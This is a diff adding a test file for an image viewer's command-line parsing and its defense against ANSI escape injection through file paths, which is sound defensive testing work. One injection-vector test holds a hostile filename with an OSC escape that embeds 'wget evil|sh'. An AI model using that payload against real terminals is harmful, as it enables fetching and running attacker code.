@@ -1,0 +1,220 @@
+# kii — CLI surface tests (standalone).
+#
+# Post-PNG-re-fold split of the old monolithic tests/kii.tcyr. Covers
+# the M1 flag-parse wiring (cmdit) + M1(c) kii_validate_color predicate
+# + M7(c) kii_path_has_control_bytes ANSI-injection defense. Pure
+# in-process — no PNG decode surface here.
+#
+# Stdlib + the cmdit dist auto-resolve from cyrius.cyml; only the
+# project module + the assert harness are included explicitly.
+
+include "src/cli.cyr"
+include "lib/assert.cyr"
+
+fn main() {
+    alloc_init();
+
+    # ---- smoke ------------------------------------------------------
+    test_group("smoke");
+    assert(1, "true is true");
+    assert_eq(1 + 1, 2, "math works");
+
+    # ---- M1(c): kii_validate_color predicate ------------------------
+    # Tier-1 scope is 8 / 16 only; 256 / truecolor are post-v1 per
+    # CLAUDE.md color-tier discipline. Locks the boundary in code so
+    # any future change that quietly admits other values regresses
+    # this test before the milestone gate.
+    test_group("M1 — kii_validate_color");
+    assert_eq(kii_validate_color(8),   1, "--color 8 valid");
+    assert_eq(kii_validate_color(16),  1, "--color 16 valid");
+    assert_eq(kii_validate_color(0),   0, "--color 0 rejected");
+    assert_eq(kii_validate_color(7),   0, "--color 7 rejected");
+    assert_eq(kii_validate_color(15),  0, "--color 15 rejected (off-by-one of 16)");
+    assert_eq(kii_validate_color(17),  0, "--color 17 rejected (off-by-one of 16)");
+    assert_eq(kii_validate_color(256), 0, "--color 256 rejected (tier-2, post-v1)");
+    assert_eq(kii_validate_color(0 - 1), 0, "--color -1 rejected");
+
+    # ---- M1(a)(b)(c): flag-parse happy paths ------------------------
+    # Each case builds a synthetic argv, registers kii's flag set into a
+    # cmdit context, parses (the pure cmdit_parse_argv core — no /proc),
+    # and reads back the captured values. cmdit's parser is unit-tested in
+    # its own tests/cmdit.tcyr; here we verify kii's wiring (short codes,
+    # defaults, value extraction). cmdit_new auto-registers --help/-h +
+    # --version/-V, so those runs return CMDIT_HELP / CMDIT_VERSION rather
+    # than setting a kii-tracked flag. width/color/verbose keep indices 2/3/4.
+
+    test_group("M1 — --help long form -> CMDIT_HELP");
+    var fs1 = cmdit_new("kii");
+    kii_register_flags(fs1);
+    var argv1[16];
+    store64(&argv1 + 0, "kii");
+    store64(&argv1 + 8, "--help");
+    assert_eq(cmdit_parse_argv(fs1, 2, &argv1), CMDIT_HELP, "--help -> CMDIT_HELP");
+    assert_eq(cmdit_get_int (fs1, KII_F_WIDTH),   0, "--width default (0 = match terminal)");
+    assert_eq(cmdit_get_int (fs1, KII_F_COLOR),  16, "--color default 16");
+
+    test_group("M1 — -V short form -> CMDIT_VERSION");
+    var fs2 = cmdit_new("kii");
+    kii_register_flags(fs2);
+    var argv2[16];
+    store64(&argv2 + 0, "kii");
+    store64(&argv2 + 8, "-V");
+    assert_eq(cmdit_parse_argv(fs2, 2, &argv2), CMDIT_VERSION, "-V -> CMDIT_VERSION");
+
+    test_group("M1 — --width N + --color N (long forms)");
+    var fs3 = cmdit_new("kii");
+    kii_register_flags(fs3);
+    var argv3[64];
+    store64(&argv3 + 0,  "kii");
+    store64(&argv3 + 8,  "--width");
+    store64(&argv3 + 16, "120");
+    store64(&argv3 + 24, "--color");
+    store64(&argv3 + 32, "8");
+    store64(&argv3 + 40, "photo.png");
+    assert_eq(cmdit_parse_argv(fs3, 6, &argv3), CMDIT_OK, "--width 120 --color 8 photo.png parses clean");
+    assert_eq(cmdit_get_int(fs3, KII_F_WIDTH), 120, "--width extracted = 120");
+    assert_eq(cmdit_get_int(fs3, KII_F_COLOR), 8,   "--color extracted = 8");
+    assert_eq(cmdit_positional_count(fs3), 1, "one positional captured");
+
+    test_group("M1 — -w N + -c N (short forms)");
+    var fs4 = cmdit_new("kii");
+    kii_register_flags(fs4);
+    var argv4[64];
+    store64(&argv4 + 0,  "kii");
+    store64(&argv4 + 8,  "-w");
+    store64(&argv4 + 16, "60");
+    store64(&argv4 + 24, "-c");
+    store64(&argv4 + 32, "16");
+    store64(&argv4 + 40, "img.png");
+    assert_eq(cmdit_parse_argv(fs4, 6, &argv4), CMDIT_OK, "-w 60 -c 16 img.png parses clean");
+    assert_eq(cmdit_get_int(fs4, KII_F_WIDTH), 60, "-w extracted = 60");
+    assert_eq(cmdit_get_int(fs4, KII_F_COLOR), 16, "-c extracted = 16");
+
+    test_group("M1 — --width=N attached syntax");
+    var fs5 = cmdit_new("kii");
+    kii_register_flags(fs5);
+    var argv5[24];
+    store64(&argv5 + 0,  "kii");
+    store64(&argv5 + 8,  "--width=80");
+    store64(&argv5 + 16, "img.png");
+    assert_eq(cmdit_parse_argv(fs5, 3, &argv5), CMDIT_OK, "--width=80 parses clean");
+    assert_eq(cmdit_get_int(fs5, KII_F_WIDTH), 80, "--width=80 extracted");
+
+    # ---- M1(d) — malformed-arg error variants -----------------------
+    # Each CmditErr the parser can emit is reachable from a plausible
+    # invocation. Locking the variant codes here means a cmdit refactor
+    # trips this test before kii silently mis-routes its error messages.
+
+    test_group("M1(d) — error: unknown flag");
+    var fs6 = cmdit_new("kii");
+    kii_register_flags(fs6);
+    var argv6[16];
+    store64(&argv6 + 0, "kii");
+    store64(&argv6 + 8, "--bogus");
+    assert_eq(cmdit_parse_argv(fs6, 2, &argv6), CMDIT_RESULT_ERR, "--bogus rejected");
+    assert_eq(cmdit_error(fs6), CMDIT_ERR_UNKNOWN, "error = UNKNOWN");
+
+    test_group("M1(d) — error: missing int value");
+    var fs7 = cmdit_new("kii");
+    kii_register_flags(fs7);
+    var argv7[16];
+    store64(&argv7 + 0, "kii");
+    store64(&argv7 + 8, "--width");          # no value follows
+    assert_eq(cmdit_parse_argv(fs7, 2, &argv7), CMDIT_RESULT_ERR, "--width without value rejected");
+    assert_eq(cmdit_error(fs7), CMDIT_ERR_MISSING_VALUE, "error = MISSING_VALUE");
+
+    test_group("M1(d) — error: bad integer value");
+    var fs8 = cmdit_new("kii");
+    kii_register_flags(fs8);
+    var argv8[32];
+    store64(&argv8 + 0,  "kii");
+    store64(&argv8 + 8,  "--width");
+    store64(&argv8 + 16, "abc");
+    store64(&argv8 + 24, "img.png");
+    assert_eq(cmdit_parse_argv(fs8, 4, &argv8), CMDIT_RESULT_ERR, "--width abc rejected");
+    assert_eq(cmdit_error(fs8), CMDIT_ERR_BAD_INT, "error = BAD_INT");
+
+    test_group("M1(d) — error: bundled short flags");
+    var fs9 = cmdit_new("kii");
+    kii_register_flags(fs9);
+    var argv9[16];
+    store64(&argv9 + 0, "kii");
+    store64(&argv9 + 8, "-hV");              # bundled — not supported
+    assert_eq(cmdit_parse_argv(fs9, 2, &argv9), CMDIT_RESULT_ERR, "-hV bundled rejected");
+    assert_eq(cmdit_error(fs9), CMDIT_ERR_BUNDLED, "error = BUNDLED");
+
+    # ---- M1(d) — positional accumulation ----------------------------
+    # Two-positional case is a usage error in main.cyr's dispatch but
+    # cmdit_parse itself accepts it (and stashes them both). Locks the
+    # "kii sees N positionals" view that the dispatch branches on.
+    test_group("M1(d) — multiple positionals captured (dispatched as usage error in main)");
+    var fs10 = cmdit_new("kii");
+    kii_register_flags(fs10);
+    var argv10[32];
+    store64(&argv10 + 0,  "kii");
+    store64(&argv10 + 8,  "a.png");
+    store64(&argv10 + 16, "b.png");
+    assert_eq(cmdit_parse_argv(fs10, 3, &argv10), CMDIT_OK, "a.png b.png parses clean");
+    assert_eq(cmdit_positional_count(fs10), 2, "two positionals captured");
+
+    # ---- M7(c) Finding 6: stderr path-echo ANSI-injection defense ----
+    # kii_path_has_control_bytes is the pure predicate behind
+    # _eprint_path_safe in main.cyr — returns 1 if the path contains
+    # any byte that must NOT be emitted to a terminal-attached fd.
+    # See docs/audit/2026-05-22-audit.md § Finding 6.
+    test_group("M7(c) — kii_path_has_control_bytes: safe paths");
+    assert_eq(kii_path_has_control_bytes(""),                   0, "empty path → safe");
+    assert_eq(kii_path_has_control_bytes("image.png"),          0, "plain ASCII → safe");
+    assert_eq(kii_path_has_control_bytes("/tmp/image.png"),     0, "absolute path → safe");
+    assert_eq(kii_path_has_control_bytes("a b c.png"),          0, "spaces → safe");
+    assert_eq(kii_path_has_control_bytes("./../image.png"),     0, "relative path → safe");
+    # UTF-8 paths must pass through — AGNOS naming uses Hawaiian,
+    # Sanskrit, East-Asian characters whose continuation bytes land
+    # in 0x80–0xBF. "kiʻi" itself contains U+02BB = 0xCA 0xBB.
+    assert_eq(kii_path_has_control_bytes("kiʻi.png"),           0, "UTF-8 (Hawaiian ʻokina) → safe");
+    assert_eq(kii_path_has_control_bytes("画像.png"),            0, "UTF-8 (CJK) → safe");
+    assert_eq(kii_path_has_control_bytes("чёрный.png"),         0, "UTF-8 (Cyrillic) → safe");
+    # Tab and LF are explicitly allowed per the coreutils-`ls`
+    # convention (LF-in-filename is filesystem-legal but rare;
+    # TAB-in-filename is more common, e.g. accidental shell paste).
+    assert_eq(kii_path_has_control_bytes("a\tb.png"),           0, "TAB → safe (allow-listed)");
+    assert_eq(kii_path_has_control_bytes("a\nb.png"),           0, "LF → safe (allow-listed)");
+
+    test_group("M7(c) — kii_path_has_control_bytes: injection vectors");
+    # ESC (0x1B) is the universal ANSI-injection lead byte. Any
+    # path containing it must be suppressed.
+    assert_eq(kii_path_has_control_bytes("\x1bfoo.png"),        1, "ESC → unsafe");
+    assert_eq(kii_path_has_control_bytes("foo\x1b.png"),        1, "ESC mid-path → unsafe");
+    # CVE-2021-25743 analog: malicious filename carrying an OSC
+    # window-title-set + DECRQSS query that would hijack the
+    # terminal if echoed raw.
+    assert_eq(kii_path_has_control_bytes("/tmp/\x1b]2;wget evil|sh\x07.png"), 1,
+              "CVE-2021-25743 OSC-injection attack path → unsafe");
+    # BEL (0x07) is the OSC string terminator — another injection
+    # primitive.
+    assert_eq(kii_path_has_control_bytes("foo\x07.png"),        1, "BEL → unsafe");
+    # DEL (0x7F) is the C0 trailer — never a legitimate filename byte.
+    assert_eq(kii_path_has_control_bytes("foo\x7f.png"),        1, "DEL → unsafe");
+    # NUL is technically not reachable through strlen (terminates
+    # the C-string), but every other C0 control should trip the
+    # predicate. Sample a few representative ones.
+    assert_eq(kii_path_has_control_bytes("a\x01b"),             1, "SOH (0x01) → unsafe");
+    assert_eq(kii_path_has_control_bytes("a\x08b"),             1, "BS (0x08) → unsafe");
+    assert_eq(kii_path_has_control_bytes("a\x0bb"),             1, "VT (0x0B) → unsafe");
+    assert_eq(kii_path_has_control_bytes("a\x0cb"),             1, "FF (0x0C) → unsafe");
+    assert_eq(kii_path_has_control_bytes("a\x0db"),             1, "CR (0x0D) → unsafe");
+    assert_eq(kii_path_has_control_bytes("a\x1fb"),             1, "US (0x1F) → unsafe");
+    # Boundary: 0x20 (SPACE) is the first printable byte; must NOT trip.
+    assert_eq(kii_path_has_control_bytes("a\x20b"),             0, "SPACE (0x20) → safe (boundary)");
+    # Boundary: 0x7E (~) is the last 7-bit printable byte; must NOT trip.
+    assert_eq(kii_path_has_control_bytes("a\x7eb"),             0, "TILDE (0x7E) → safe (boundary)");
+    # Boundary: 0x80 is the first UTF-8 continuation byte — must
+    # NOT trip (the audit doc's initial recommendation to reject
+    # 0x80–0x9F was relaxed for UTF-8 ergonomics).
+    assert_eq(kii_path_has_control_bytes("a\x80b"),             0, "0x80 (UTF-8 continuation) → safe (UTF-8 pass-through)");
+
+    return assert_summary();
+}
+
+var exit_code = main();
+syscall(60, exit_code);
